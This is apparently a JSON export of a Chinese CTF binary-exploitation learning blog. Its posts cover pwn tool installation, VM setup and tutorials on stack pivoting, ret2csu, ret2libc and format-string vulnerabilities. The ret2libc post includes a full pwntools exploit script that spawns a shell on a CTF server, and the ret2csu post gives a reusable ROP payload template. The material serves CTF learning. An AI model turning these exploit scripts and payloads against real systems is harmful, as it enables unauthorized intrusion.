{"meta":{"title":"Chen","subtitle":"","description":"ChenBlog","author":"Chen","url":"http://example.com","root":"/"},"pages":[{"title":"所有分类","date":"2022-09-16T10:58:56.147Z","updated":"2022-09-16T10:58:56.147Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"pwn需要的一些工具安装","slug":"pwn需要的一些工具安装","date":"2022-09-30T04:09:03.000Z","updated":"2022-09-30T13:03:00.323Z","comments":true,"path":"2022/09/30/pwn需要的一些工具安装/","link":"","permalink":"http://example.com/2022/09/30/pwn%E9%9C%80%E8%A6%81%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/","excerpt":"","text":"这篇文章用来记录搭建pwn手需要的环境 要下载什么工具以及如何下载 其他方向的可以当个参考 vimVim是一个类似于Vi的著名的功能强大、高度可定制的文本编辑器 1sudo apt install vim 输入该行指令安装 安装完成后 在终端输入vim 查看是否安装成功 如果成功 会显示以下内容 具体的使用方法这里就不教了 gitGit是一个开源的分布式版本控制系统，可以有效、高速地处理从很小到非常大的项目版本管理 后面会经常使用github 所以这个必装 1sudo apt install git 安装后输入 查看是否安装成功 1git --version 成功了以后会像下图所示 gcc必装 没啥好解释的 自己编写程序放到gdb中印证猜想必备 1sudo apt install gcc 这个安装的比较久 下好了以后输入验证一下 1gcc -v python3这个也是必备的 做题没有这个怎么做 这里不下2是因为2已经停止维护了 虽然3的数据类型更加严格 但是总归可以适配 1sudo apt install python3-pip 输入验证是否安装成功 1pip -v 这里还有一条可以偷懒的指令 我们调用python3不是还要多打一个3 这一个插件可以默认打python即为python3 1sudo apt install python-is-python3 可以直接输入python看可以不可以 qemups:接下来的图片可能会突然大变，因为这中途我美化了一下虚拟机 所以终端颜色变了 看不习惯见谅 解释不来 没用会 抄一段百度wiki 而且这个下起来巨久 我的建议是先放一放 最后安 QEMU是一套由法布里斯·贝拉(Fabrice Bellard)所编写的以GPL许可证分发源码的模拟处理器软件，在GNU&#x2F;Linux平台上使用广泛。Bochs，PearPC等与其类似，但不具备其许多特性，比如高速度及跨平台的特性，通过KQEMU这个闭源的加速器，QEMU能模拟至接近真实电脑的速度 1sudo apt-get install qemu-user qemu-system 1qemu- //检测安装是否成功 输完按两下tap键 gdb-multiarch用作gdb客户端进行调试，是任何架构的通用客户端 1sudo apt-get install gdb-multiarch 输入检测是否安装成功 1gdb-multiarch -v PWN工具 这里我们为了方便存放所有的工具 所以在主目录里面创建一个新的文件夹tools(自己爱怎么命名怎么来) 你是不是觉得你都要成为一名黑客了 怎么还用怎么土气的办法创建文件夹？来 用下面的指令也行 12cd ~mkdir tools 注意注意！！！！接下来pwntools工具的安装 终端都给我到tools文件夹里面！！！ 而且下啥就新建一个文件夹存放！！！！ 我下面的图显示的是不在对应文件夹里面安装的！！别学错了 下面所有的下载过程有可能会报错，目前找不到什么原因，哪步报错，重新执行哪步就好了 pwntoolsPwntools是一个CTF框架和开发库。它是用Python编写的，设计用于快速原型和开发，旨在使开发编写尽可能简单 有两种安装方法，一种是git项目后安装，另一种是pip直接安装。这里我们把pwntools git下来，但是用pip安装，因为后续的工具需要pwntools项目包里的脚本，pip安装不会出错。安装过程时间较长，保持网络状态良好 12cd toolsgit clone https://github.com/Gallopsled/pwntools.git 执行到第二条的时候发现执行不了了，被墙了，别怕 好解决 直接在http后面加上gitclone.com&#x2F;就行了 12gitclone.com/git clone https://gitclone.com/github.com/Gallopsled/pwntools.git 可以看到下载成功了 接下来还要三条指令 123sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essentialpython3 -m pip install --upgrade pippython3 -m pip install --upgrade pwntools 巨久巨久巨久！！而且套娃 安的时候等的我想死 可以看到安装成功了 pwndbg动态调式用的 必安 不安等哭吧 同类的还有peda gef 感兴趣的可以自己去安(如果你安装了两个以上 记得切换souce文件 办法这里不教) 这个也安很久 很烦 1git clone https://gitclone.com/github.com/pwndbg/pwndbg.git 接下来你会看到文件夹里多了一些文件 到对应文件夹里面输入 1./setup.sh 安装完了以后输入gdb看是否成功 还没完 还得安装插件依赖 1sudo pip install keystone-engine ropper keystone-engine ROPgadget找汇编代码神器 必安 12sudo pip3 install capstonegit clone https://gitclone.com/github.com/JonathanSalwan/ROPgadget.git 安装完了以后 进到对应文件夹里面 1sudo python3 setup.py install 安装完了以后输入ROPgadget 别管那个error报错 纯属就是格式问题 one_gadget可装可不装 我是没用到过 下面这段话我当你是看过栈分类中的rop32 这个工具大概就是自动帮我们寻找一串能构成system(&#x2F;bin&#x2F;sh)的汇编代码 我们返回到他给的地址就行了 12sudo apt install -y ruby ruby-devsudo gem install one_gadget 输入查看是否安装成功 1one_gadget --version seccomp-tools这个是沙盒题会用到的了 估计等你学个一个月多就能碰见了(我是这样的) 1sudo gem install seccomp-tools 输入查看是否安装成功 1seccomp-tools --version LibcSearcher这个拿来查libc版本的 求基址偏移用的 我是感觉网页也能做到同样的效果 爱安不安吧 1git clone https://gitclone.com/github.com/lieanu/LibcSearcher.git 进入到对应文件夹再打开终端 1sudo python3 setup.py install 输入检测 12pythonfrom Libcsearcher import* 不过我们发现会报错(返回到桌面运行终端的话) 解决办法也很简单 把刚才安装的那个文件夹里面的这个复制一份到桌面就可以了 patchelf这东西和上面那个配套用的 用来切换libc版本 一些堆题和栈题会用到 1sudo apt install patchelf 安装完了以后输入 1patchelf --version ARM软件包没用过 不知道干啥的 爱装不装 用到了再说也行 只要你不嫌麻烦 12sudo apt-get install gcc-arm-linux-gnueabisudo apt-get install gcc-aarch64-linux-gnu MIPS软件包同上 1234sudo apt-get install gcc-mips-linux-gnusudo apt-get install gcc-mipsel-linux-gnusudo apt-get install gcc-mips64-linux-gnuabi64sudo apt-get install gcc-mips64el-linux-gnuabi64 暂时就这点了 以后有用到新的再说","categories":[{"name":"虚拟机","slug":"虚拟机","permalink":"http://example.com/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/"}],"tags":[]},{"title":"复制粘贴问题解决","slug":"复制粘贴问题解决","date":"2022-09-30T02:51:22.000Z","updated":"2022-09-30T03:06:24.877Z","comments":true,"path":"2022/09/30/复制粘贴问题解决/","link":"","permalink":"http://example.com/2022/09/30/%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/","excerpt":"","text":"Ubuntu20.04无法安装vmtools 或者出现安装了也没办法做到物理机和虚拟机复制粘贴共用 所以这里我们用open-vm-tools 这是一个vmtools官方承认的开源工具 其一样可以起到vmtools的作用 第一步输入下面的指令 1sudo apt-get autoremove open-vm-tools 第二步我们输入 1sudo apt-get install open-vm-tools-desktop 但是很遗憾 会出现这样的问题 这时候我们需要更改一下下载源 网上的方法是说在这里搜索software-update 但是我查看了以后发现找不到 最后找到的解决办法是 因为还没有安装输入法 所以只能先输入set 然后打开设置 一直向下滑 直到看到关于 点进去 找到软件更新 再点进去 如图所示 点开后选择other(也可能显示成其他 看你刚创建虚拟机时的语言选择) 这里挑一个选 我选择的是阿里云的 退出的时候会提醒你这个 直接点重新载入就好了 在终端中输入 1sudo apt-get update 然后我们再输入 1sudo apt-get install open-vm-tools-desktop 发现就可以了 安装完成之后 在终端输入 1reboot 重启一下虚拟机 发现就可以做到物理机和虚拟机复制粘贴互通了","categories":[{"name":"虚拟机","slug":"虚拟机","permalink":"http://example.com/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/"}],"tags":[]},{"title":"虚拟机安装","slug":"虚拟机安装","date":"2022-09-29T11:02:21.000Z","updated":"2022-09-29T12:47:40.132Z","comments":true,"path":"2022/09/29/虚拟机安装/","link":"","permalink":"http://example.com/2022/09/29/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85/","excerpt":"","text":"虚拟机对于pwn手而言必不可缺，本人直到完成栈的大部分学习后，都没有搭建一个自己的虚拟机 所以这个系列将记录我安装的过程，和安装过程中出现的问题 下载vmware这个不手把手教，因为我已经下过了，不想删了再演示一遍，自己百度吧 创建虚拟机这里我们选择Ubuntu系统，其对于pwn手更加友好 打开vmware 点击创建新的虚拟机 选择第二个 自定义高级 然后点击下一步 这里不需要任何更改，直接下一步就好了 选择第三个 稍后安装操作系统 然后下一步 这一步多动动手点 选择linux ubuntu64位 挑一个地方安装 这个取决于你自己 这个根据自己的cpu核心数选吧 没啥好指导的 毕竟每个人都不一样 内存同理 自己根据情况选吧 不影响使用就行 从这里开始 就一直点下一步就好了 不过别狂点 有个地方还是要注意一下 下面遇到了我会注明文字 好了 接下来注意了 下一个要手动调整一下 这里根据自己的情况分配硬盘大小 不过后面随时都能更改 不够再给也行 别选第一个立刻分配 不然一下子就占用你20g(自己选择的硬盘大小) 这个字面意思理解吧 挑一个地方放虚拟机硬盘 比你设置的大就行了 好了 到了这边 基础的配置就完事了 不过不要急着打开 我们还要编辑一下虚拟机设置 这里我们需要Ubuntu的映像文件 可以去官网下载 也可以找我要一份(不过我大概率懒得给，官网下载不教了 不能养成废人) 设置好了以后我们就可以打开虚拟机了 开机后我们会出现这样一个界面 选择第一个 等待一会 然后出现了这个界面 选择中文 英语大佬可以直接冲 选好了以后我们点右边的选项 安装Ubuntu 键盘布局默认就可以了 这个根据个人的需求吧 我是默认了 然后接下来就一直默认 直到选择时区 然后再下一步 这个账号密码要记牢了 以后有很多地方都要用到 接着就开始等待了 这里等skip亮起来可以点了 建议直接跳过 因为时间真的太长了 别鸟他 直接关了就行了 然后我们重新进行虚拟机的配置 改回物理驱动就可以了使用虚拟机了","categories":[{"name":"虚拟机","slug":"虚拟机","permalink":"http://example.com/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/"}],"tags":[]},{"title":"堆基础知识","slug":"堆基础知识","date":"2022-09-29T05:05:29.000Z","updated":"2022-09-29T05:05:29.617Z","comments":true,"path":"2022/09/29/堆基础知识/","link":"","permalink":"http://example.com/2022/09/29/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"栈迁移","slug":"栈迁移","date":"2022-09-26T13:40:18.000Z","updated":"2022-09-28T01:13:04.377Z","comments":true,"path":"2022/09/26/栈迁移/","link":"","permalink":"http://example.com/2022/09/26/%E6%A0%88%E8%BF%81%E7%A7%BB/","excerpt":"","text":"我们在基础知识扩展的时候，说到了为了避免有些题目供我们构造的字节数过少，以至于无法给system函数传参的时候该怎么解决 今天所要讲到的内容，也是和栈溢出字节数不够有关 当可以供我们编写的字节数仅够覆盖到ret addr时，并且该程序内并没有后门函数可以供我们利用，我们又该如何实现系统调用呢？ 我们以往的简单栈溢出是通过覆盖ret addr的办法控制程序执行流导向后门函数的位置 但是其本质上 ebp和esp并没有被我们所控制，他仍然是按照原先栈底的汇编代码所运行的 所以我们换个思路？不妨劫持esp和ebp，让他们前往bss段或者其他可以供我们自由写入的区 这样我们就可以自己构建一个后门函数，并且将程序执行流引导至其 那问题就来到了如何劫持esp和ebp 我们先得清楚一下栈帧这个概念 栈帧栈帧也叫过程活动记录，是编译器用来实现函数调用过程的一种数据结构 简单理解就是每次函数的调用，都会生成自己的栈帧 栈帧就相当于函数的调用框架，包含了函数的参数，函数的局部变量，函数执行完后的返回地址 系统是如何定义一个栈帧的？ebp指向了栈帧的栈底，esp指向了函数的栈顶 也就是说，我们把esp和ebp劫持的目的，就是让系统错以为我们写入shellcode的bss段(包括但不限)是一个栈帧 从而执行他 栈迁移原理归根到底，就是要如何劫持esp和ebp 回到我们最开始的栈溢出，我们要溢出的字节数&#x3D;变量var距离esp的字节数+一个字长 这里的一个字长覆盖的是ebp 在我们没有对ebp覆盖的时候，其保存的是上层函数的栈底地址，而ret addr保存的是上层函数执行到了哪个地方，方便子函数结束后返回父函数最后执行的地方 在一个栈帧结束的时候，eip 即将执行 leave 与 ret 两条指令恢复现场(即返回父函数) leave指令相当于 mov esp ebp和pop ebp 他将ebp和esp指向同一地址，这一步相当于腾出了栈帧空间 随后pop ebp 将此时esp指向的old ebp(因为我们上面说过了嘛，ebp保存的是上层函数的栈底地址)赋值给真正的ebp(此时的ebp是定义栈帧栈底的ebp) 是不是有点晕？首先你要分清楚ebp保存的内容和ebp寄存器这两个概念 在子函数调用开始之前，系统会将父函数栈底的地址弹出到新的栈帧，这个值就是ebp(就是我们之前栈溢出用垃圾数据覆盖的那个嘛) 然后记录下当前父函数运行到的地址，将其弹出为ret addr，等子函数结束以后，就会返回到这个地址 所以说，如果我们覆盖ebp的时候不用垃圾数据，而是放入我们要使ebp迁移到的地址，那么ebp就会被我们挟持走 但是此时还有个esp寄存器怎么办？栈帧的空间需要这二者才能定义 你还记不记得我们构造rop链的手法？我们自己再找一个leave的汇编代码地址然后覆盖ret addr不就好了？ 此时mov esp ebp会起到什么效果？ebp已经指向了我们要迁移的地址，所以esp也被挟持到了那边 但是注意，还有一句pop ebp 虽然这句没有任何作用，因为此时新的栈帧的栈顶，其保存的已经是我们要挟持到的地方的地址 但是这一句是出栈指令，此时我们的esp，他指向的地址就会增加一个字长 如图所示，HijackAddr就是我们想要劫持esp ebp到的地址 那栈迁移运作的原理我们已经搞清楚了是吧，接下来想办法构造payload payload &#x3D; cyclic(offset)+pxx(addr)+pxx(leave_addr) 这一个没有问题吧 那只剩下最后一个问题了，我们迁移到的那个地址的栈内容要怎么编写 aaaa是我们最开始的那个地址存放的垃圾数据，即上文说到的HijackAddr,因为pop ebp的原因，esp会指向高一个字长的地方 dddd则是32位情况下的传参，中间要隔个垃圾数据，这没什么好说的 下一个binsh_addr 和binsh字符串是什么意思，当程序连binsh都没给我们的话，反正我们都能自己编写一段栈帧了，我们不是可以自己写入一段binsh，然后我们也知道其地址了，不是就能调用了 后面的old_ebp和ret_addr也没什么好说的，就是一段栈帧必须的要素","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"ret2csu","slug":"ret2csu","date":"2022-09-25T06:47:11.000Z","updated":"2022-09-25T07:57:39.286Z","comments":true,"path":"2022/09/25/ret2csu/","link":"","permalink":"http://example.com/2022/09/25/ret2csu/","excerpt":"","text":"我们已经了解过了基础的rop，其主要的局限性在于大部分的题目都是动态链接 不一定有那么刚好的汇编代码可以供我们构造rop链 今天我们了解的这种方法，将不受动态链接或者静态链接的限制 我们今天的主角就是libc_csu_init函数，其作用是对libc进行初始化，由于绝大多数的程序都会调用函数，所以libc_csu_init是一定存在的(对于调用函数的程序而言) 那么这个函数究竟有什么奇效，让我们可以做到随意构造rop链呢？ 来看看在ida中，这个函数是什么样子的 1234567891011121314151617181920212223242526272829303132333435363738394041424344.text:00000000004011B0 ; void _libc_csu_init(void).text:00000000004011B0 public __libc_csu_init.text:00000000004011B0 __libc_csu_init proc near ; DATA XREF: _start+16↑o.text:00000000004011B0 ; __unwind &#123;.text:00000000004011B0 push r15.text:00000000004011B2 mov r15, rdx.text:00000000004011B5 push r14.text:00000000004011B7 mov r14, rsi.text:00000000004011BA push r13.text:00000000004011BC mov r13d, edi.text:00000000004011BF push r12.text:00000000004011C1 lea r12, __frame_dummy_init_array_entry.text:00000000004011C8 push rbp.text:00000000004011C9 lea rbp, __do_global_dtors_aux_fini_array_entry.text:00000000004011D0 push rbx.text:00000000004011D1 sub rbp, r12.text:00000000004011D4 sub rsp, 8.text:00000000004011D8 call _init_proc.text:00000000004011DD sar rbp, 3.text:00000000004011E1 jz short loc_4011FE.text:00000000004011E3 xor ebx, ebx.text:00000000004011E5 nop dword ptr [rax].text:00000000004011E8.text:00000000004011E8 loc_4011E8: ; CODE XREF: __libc_csu_init+4C↓j.text:00000000004011E8 mov rdx, r15.text:00000000004011EB mov rsi, r14.text:00000000004011EE mov edi, r13d.text:00000000004011F1 call qword ptr [r12+rbx*8].text:00000000004011F5 add rbx, 1.text:00000000004011F9 cmp rbp, rbx.text:00000000004011FC jnz short loc_4011E8.text:00000000004011FE.text:00000000004011FE loc_4011FE: ; CODE XREF: __libc_csu_init+31↑j.text:00000000004011FE add rsp, 8.text:0000000000401202 pop rbx.text:0000000000401203 pop rbp.text:0000000000401204 pop r12.text:0000000000401206 pop r13.text:0000000000401208 pop r14.text:000000000040120A pop r15.text:000000000040120C retn.text:000000000040120C ; &#125; // starts at 4011B0.text:000000000040120C __libc_csu_init endp 我们的目光聚集到loc_4011FE和loc_4011E8 我们暂且把loc_4011E8命名为gadget1，把loc_4011FE命名为gadget2 由于逻辑顺序的原因，所以我们这里先介绍gadget1 可以看到他先将rsp的位置增加8个字节，这8个字节尤为关键，我们下面再进行解释 接着他pop了多个寄存器，但是仍然没有我们需要的rdi和rsi，不过先别急，再往下想想 最后一行有个retn，我们可以利用这个ret将返回地址修改为gadget2，用意在你看完整个的流程分析后就会明白 再把目光看到gadget2 mov指令将r15和r14以及r13的数据分别传给了寄存器rdx，rsi和edi，这样子实际上就实现了我们要调用函数首先要做到的传参 这里解释一下edi，我们之前不是说过在64位的情况下，是r开头的吗，其实情况也不是绝对的 64位情况下的edi只能改写rdi低32位字节的数据，高32位的字节是无法更改的，不过此时rdi的高32位的数据为0，并不影响我们更改rdi的值 接下来的call指令就是重头戏，可以看到他call的值是r12+rbx*8 有没有一种可能，如果我们把rbx赋值为0，而把r12赋值为我们想要执行的函数地址(为什么不反过来，一是*8转化不方便，还有一个原因下面讲到)，那么我们就可以实现函数调用 接着对rbx进行了+1的操作 而我们上面讲到，我们准备把rbx的值设置为0，所以此时的rbx就为1 cmp对于rbx和rbp二者进行了对比，如果二者相同，则不进行下一条指令，也就是jnz的跳转，即重新执行一次刚才的汇编代码 所以此时我们需要将rbp的值设置为1，才能使其于rbx相等 收回思绪，我们接着想，程序执行完gadget2后会怎么样？ 其实没有多高深的想法，他会按照顺序接着执行下去，那么又回到了我们的gadget1 接下来，由于我们已经实现了我们想要的寄存器传参，所以此时的寄存器是什么值我们已经不在乎了 我们可以简单的用cyclic(8*7)简单的实现填充垃圾数据，然后在末尾的ret在自行决定我们接下来要返回的地址 缕清楚了整个__libc_csu_init函数的思路，我们来回顾一下刚才提出的问题，rsp+8会怎么影响我们的程序，我们来用图表示一下栈结构试试看 第一行和第二行以及第三行没有什么好解释的 常规的栈溢出 然后控制返回地址使程序返回到libc_csu_init函数 此时的sp指针，是指向到了add rsp+8这行汇编代码，+8即让其继续向栈顶增进了一个字长，所以此时我们要在add rsp+8该行汇编代码处填充的数值，可以是任何，即垃圾数据 那么，总结一下，我们可以得出一个通用的payload 12345678910111213141516payload = offset * &#x27;a&#x27; #栈溢出的垃圾数据字节数payload += p64(gagdet2_addr) + &#x27;a&#x27; * 8 #gadgets2的地址payload += p64(0) + p64(1)#rbx=0, rbp=1payload += p64(r12)#call调用的地址payload += p64(r13) + p64(r14) + p64(r15)#三个参数的寄存器payload += p64(gagdet1_addr)#gadgets1的地址payload += &#x27;a&#x27; * 56#第二次pop 由于寄存器是啥数值我们已经不需要了 所以56个字节全部用垃圾数据覆盖payload += p64(last)#函数最后的返回地址","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"ret2libc","slug":"ret2libc","date":"2022-09-23T12:53:48.000Z","updated":"2022-09-24T16:01:54.574Z","comments":true,"path":"2022/09/23/ret2libc/","link":"","permalink":"http://example.com/2022/09/23/ret2libc/","excerpt":"","text":"前置知识了解随着我们做题的深入，我们会发现有些题目并不会给予我们后门函数，并且也没有ret2shellcode可以供我们存放shellcode的bss段变量 那么我们还有办法自己构建一个后门函数吗 不知道还记不记得在最开始的栈溢出那一题，我们提到了plt表和got表 在当时，为了照顾新手入坑pwn的感受，我们只是粗略的得出plt调用函数，got存真实地址的服务于做题的结论 现在，让我们解释一下这个结论的原因 我们先前已经讲过，got表的作用是因为动态链接的存在，为了使应用程序方便的获取libc中的真实地址 并且只有当程序运行和函数调用过后，got表中保存的才会是该函数的libc的绝对地址 而plt表虽然引用的也是got表中的真实地址，但是注意这里并不是说明got表能够调用这个函数 plt表之所以能够调用函数，而got不行的关键原因是因为plt表还起到了把控制(程序执行流)转移到对应的函数 当然上述的解释并不详细，许多原理性的问题没有讲到，如果将来想要死磕pwn的同学，建议花时间去专研透底层逻辑的问题(当然现在没有必要) 所以我们是不是可以得出一条逻辑链，当程序没有给予我们现成的后门函数的时候，我们可以通过system的plt表来调用system函数 但是说的容易做起来难，我们如何获得system函数的plt表地址呢？ 这里我们只需要记住一个公式 真实地址 &#x3D; 基址 + 偏移 即我们通过puts等函数泄露出来的函数地址是真实地址，我们可以通过计算偏移来求出libc基址 然后依据libc基址和偏移量得出其他函数的真实地址，从而随意调用 但是如果我们不了解libc版本，即题目附件并为给出呢 这里还需要了解一下libc中函数地址偏移的概念 如果开启了pie保护机制，函数的地址将在每次运行时发生变化 但是其后三位由于虚拟地址页的映射机制，将不会发生变化(前提是在同一个libc版本中) 因此，如果题目没有给予我们libc文件的话，我们可以通过函数的后三位来推演出libc版本，从而求得libc基址 wp演示 先看一下保护机制，但是看不出什么苗头 拖到ida里面看看 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s[32]; // [rsp+0h] [rbp-20h] BYREF init(argc, argv, envp); puts(&quot;Glad to meet you again!What u bring to me this time?&quot;); fgets(s, 96, stdin); puts(&quot;Ok.See you!&quot;); return 0;&#125; 有一个fgets输入任意字节的数据可以用来栈溢出，但是看了下函数列表，好像没有后门函数可以供我们返回 并且程序也没有提供给我们可以用来泄露函数地址的puts等 没办法了，我们只能连同puts函数泄露其真实地址一起构造 看到这里是不是仍然不太明白，看看exp的构造就知道了 123456789101112131415161718192021221 from pwn import* 2 io = remote(&quot;node4.buuoj.cn&quot;,28548)3 elf = ELF(&quot;./pwn&quot;)4 libc = ELF(&quot;./libc-2.31.so&quot;)5 io.recvuntil(&quot;Glad to meet you again!What u bring to me this time?&quot;)6 puts_got = elf.got[&#x27;puts&#x27;]7 main_addr = elf.symbols[&#x27;main&#x27;]8 rdi_addr = 0x4007539 ret_addr = 0x40050e10 puts_got = elf.got[&#x27;puts&#x27;]11 puts_plt = elf.plt[&#x27;puts&#x27;]12 payload = cyclic(40)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)13 io.sendline(payload)14 io.recvuntil(&quot;Ok.See you!&quot;)15 puts_addr = u64(io.recvuntil(&quot;\\nGlad to meet you again!What u bring to me this time?\\n&quot;,drop = True).ljust(8,b&#x27;\\x00&#x27;))16 libc_addr = puts_addr - libc.symbols[&#x27;puts&#x27;]17 system_addr = libc_addr + libc.symbols[&#x27;system&#x27;]18 binsh_addr = libc_addr + next(libc.search(b&#x27;/bin/sh&#x27;))19 payload = cyclic(40)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)20 io.sendline(payload)21 io.recvuntil(&quot;Ok.See you!&quot;)22 io.interactive() 第四行这里，我们之所以要装载题目附件所给我们的libc-2.31.so文件 是因为我们需要获取该libc版本的各函数相较于基址的偏移 同理，这里还有两种办法可以获取(实际上还有三种，但是最后一种我还不会用[截止到文章发布，如果后续学会了将会补上]) 获取libc版本偏移-第一种办法 在该网站 我们可以通过输入对应函数的后3位数值来检索对应的libc版本(比如图中检索到了3个版本，通常是都得试试的) libc database search (blukat.me) 获取libc版本偏移-第二种办法 libcsearch这个工具也能获取偏移 由于网上对于这个工具的安装和使用不计其数 这里我只负责介绍这个工具，安装过程如果出现问题可以看看这个博客(3条消息) LibcSearcher的安装使用_Catch_1t_AlunX的博客-CSDN博客 说回到exp，我们继续往下看，截止到12行的第一个payload都是一些前置的要点获取 cyclic生成40个字节的垃圾数据这个没有任何难度理解 rdi寄存器传参这条之前也解释过了，puts_got显然就是将puts函数的真实地址传给rdi 接下来的puts_plt便是调用puts函数，输出puts函数的真实地址 接着为什么要返回到main函数？因为我们还需要接收puts的真实地址，并且我们只能输入96个字节的数据，如果一次性构造payload过长则无法成功 第三个疑点来到了15行，有很多我们没有见过的语法？ u64，[-6:]，ljust？这些都是什么东西，一个一个讲 u64&#x2F;u32 不知道你还记不记得我们之前讲过的bite型，他起到了数据的传输和存储的作用 你是不是一直有个疑问，为什么我们要用到p64和p32 实际上p是将括号内的数据打包成二进制字节数据流(可以理解为bite型) 而如果我们要想接收，并且转化为我们能看懂的数据类型，就需要用到u 为了方便理解，我们看一下如果没有u64，我们得到的数据会是什么样子 [-n:] 其作用就是决定recv从倒数第n个字节开始读取 但是为什么这里是6呢？我们试试4，5，7这些数字会导致什么结果 这里不知道你发现没有，一个字节对应着两个字符(之前提过了，这里小复习一下) 并且由于小端序，所以我们从倒数第几个字节开始接收，影响着我们得到的真实地址的后三位 拜托，这可是致命的错误，后三位错了我们还怎么获得偏移 通常，函数的真实地址虽然是8字节(64位)，但是由于其头两个字节的数据恒为00 00 所以我们只需要从倒数第六字节开始读取(反而言之，就是你要从倒8处读也行) 欸 你说 我偏不要呢 我就不要[-6:]你来帮我限制读入的字节数量 反正我就8字节的地址呗 如果你尝试了以后就会报错，为什么？ 因为我们不单单只读入了函数的真实地址，数据传输以及内存地址分配是一个复杂的过程 而我们将其改为100试试，仍然可以正常读入数据 但是你会发现在地址结尾处多出来了个0a，实际上他是换行符，这个换行符是哪里来的？ 仔细观察14行 我们在接收的时候，并未一起接收换行符 这一点说明了什么?修改为100后都能读取倒上一个字符串的数据了，那我们刚刚不还说在函数地址上面，还有很多其他数据呢？ 这里就可以介绍介绍ljust了 ljust 他的作用就是限制我们读入的字节总数，如果不够的话则以我们设定好的字符填充 所以我们哪怕[-n:]中的n取到了100也仍然不会报错 说回exp 在第一个payload输送完以后，我们成功获得函数的真实地址 接着就是计算偏移然后求得其他函数以及binsh字符串的地址 还是老办法构造payload，并且这里还需要一个ret来栈对齐 补充：一点小补充吧 相信会有人和我有一样的疑问，在刚接触到ret2libc的时候 既然我们都将got表中的puts函数真实地址作为参数存储在了rdi寄存器中输送再接收 而且获取真实地址的方法只需要一个elf.got就行了 为什么我们不能直接拿这个地址来进行计算基址呢？ 很简单，我们debug看一下，如果我们直接使用got表中的真实地址，他是一个什么东西 我们再看一下 通过我们上文的办法得到的真实地址长什么样子 可以看到明显不一样 这是因为got表中保存的值是需要运行过后才会为真实地址，所以我们需要将其打印出来再接收(这里我也有点不太理解，埋个坑，日后填)","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"格式化字符串漏洞","slug":"格式化字符串漏洞","date":"2022-09-22T13:55:33.000Z","updated":"2022-09-23T09:14:29.157Z","comments":true,"path":"2022/09/22/格式化字符串漏洞/","link":"","permalink":"http://example.com/2022/09/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"格式化字符串漏洞原理printf应该是我们学习c语言起使用的最频繁的函数了 其语法我们熟悉的不能再熟悉了—&gt;printf (“格式化字符串”,参量… ) 我们可以写一段代码： 1234567#include &lt;stdio.h&gt;int main()&#123; int n=5; printf(&quot;%d&quot;,n); return 0;&#125; 当然我们也可以这样写： 1234567#include &lt;stdio.h&gt;int main()&#123; char a[]=&quot;chen&quot;; printf(a); return 0;&#125; 第二种写法虽然没有格式化字符但是仍然可以输出chen这个字符串 那我们再看看第三种写法 1234567#include &lt;stdio.h&gt;int main()&#123; char a[]=&quot;%x%x%x&quot;; printf(a); return 0;&#125; 这次我们没有给printf函数参数，只是仅仅给他格式化字符，猜一下，这次能成功吗，如果成功了，会输出什么？ 输出了像地址的16进制？ 我们明明没有给他用以输出的参数，那么这串数据是从哪里来的？ 我们用图来表示一下printf输出的时候栈结构是什么样子 ps:关于这图，格式化字符串不一定要放在栈顶才能实现任意地址写入，注意别被误导了，下面会提一嘴 如果我们只传入了格式化字符串而没有传入参数 那么格式化字符串仍然会遵循着原先的逻辑，向高地址处逐个字长的输出当前栈的内容&#x2F;指针(输出的方式根据其格式化字符的不同而不同) 这是因为printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束 pwn题中的格式化字符串通常有两种出法 第一种，使用格式化字符串泄露栈上的内容(canary或者是随机数不一定)，由于wp分类中的HUBU2022.fmt已经是这方面的例题了，这里不做额外的讲解，感兴趣的可以去wp分区中自行查看 第二种，也是难度较前者稍高，不好理解的一种 任意内存的读取及任意内存写入我们首先得了解一个不常用的格式化字符串**%n** 他的作用是将在其之前打印出来的字节数赋值给指定的变量 比如: AAAA%n 就会赋值4给变量 如果我们后面跟上要修改的变量地址，就可以做到任意地址的写入 没懂？没关系来看一道例题 开了canary保护，大概率是格式化字符串 看看ida 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int a1)&#123; unsigned int v1; // eax int result; // eax int fd; // [esp+0h] [ebp-84h] char nptr[16]; // [esp+4h] [ebp-80h] BYREF char buf[100]; // [esp+14h] [ebp-70h] BYREF unsigned int v6; // [esp+78h] [ebp-Ch] int *v7; // [esp+7Ch] [ebp-8h] v7 = &amp;a1; v6 = __readgsdword(0x14u); setvbuf(stdout, 0, 2, 0); v1 = time(0); srand(v1); fd = open(&quot;/dev/urandom&quot;, 0); read(fd, &amp;dword_804C044, 4u); printf(&quot;your name:&quot;); read(0, buf, 0x63u); printf(&quot;Hello,&quot;); printf(buf); printf(&quot;your passwd:&quot;); read(0, nptr, 0xFu); if ( atoi(nptr) == dword_804C044 ) &#123; puts(&quot;ok!!&quot;); system(&quot;/bin/sh&quot;); &#125; else &#123; puts(&quot;fail&quot;); &#125; result = 0; if ( __readgsdword(0x14u) != v6 ) sub_80493D0(); return result;&#125; 这里的&#x2F;dev&#x2F;urandom是什么？ 